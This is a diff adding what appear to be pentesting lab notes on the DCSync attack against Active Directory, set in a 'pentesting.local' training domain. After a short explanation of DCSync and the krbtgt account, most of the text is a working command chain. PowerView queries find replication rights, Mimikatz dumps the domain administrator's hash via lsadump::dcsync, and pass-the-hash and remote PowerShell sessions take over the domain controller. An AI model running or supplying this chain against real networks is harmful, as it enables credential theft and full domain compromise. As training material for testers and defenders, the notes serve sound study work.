@@ -1,0 +1,38 @@
+DCSync is a credential dumping technique that can lead to the compromise of individual user credentials, and more seriously as a prelude to the creation of a Golden Ticket, as DCSync can be used to compromise the krbtgt account’s password.
+To perform a DCSync attack, an adversary must have compromised a user with the Replicating Directory Changes All and Replicating Directory Changes privileges. Members of the Administrators, Domain Admins, Enterprise Admins, and Domain Controllers groups have these privileges by default. It is also possible for any user to be granted these specific privileges. Once obtained, an adversary uses the Directory Replication Service (DRS) Remote Protocol to replicate data (including credentials) from Active Directory.
+The KRBTGT is a local default account that acts as a service account for the Key Distribution Center (KDC) service. It's created automatically when a new domain is created. It cannot be deleted. its name cannot be changed. it cannot be enabled.
+KDC service handles all Kerberos ticket requests so KRBTGT account in AD plays a key role that encrypts and sign all Kerberos tickets for the domain.
+
+
+
+Get-ForestGlobalCatalog
+
+Get-DomainUser -Name student1
+
+#Get the object ACL for the pentesting.local forest
+Get-ObjectACL "DC=pentesting,DC=local" -ResolveGUIDs 
+
+#Get the object ACL matching ObjectAceType = DS-Replication for the pentesting.local forest
+Get-ObjectACL "DC=pentesting,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -like 'DS-Replication*')
+
+#Get the object ACL matching ObjectAceType = DS-Replication and SecurityIdentifier for my current user =  for the pentesting.local forest
+Get-ObjectACL "DC=pentesting,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -like 'DS-Replication*') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }
+
+#Get the all the ACL in the pentesting.local forest for my current SecurityIdentifier
+Get-ObjectACL "DC=pentesting,DC=local" -ResolveGUIDs | ? { ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }
+
+
+#dump the commands for administrator
+invoke-mimikatz -Command '"lsadump::dcsync /user:pentesting\administrator"'
+
+#pass the hash to become the administrator
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain: /ntlm: /run:powershell.exe"'
+
+#see if we are administrator
+invoke-command -ComputerName dc.pentesting.local -ScriptBlock{whoami;hostname}
+
+#enter powershell session for the dc as the administrator
+Enter-PSSession -ComputerName dc.pentesting.local
+hostname
+whoami
+
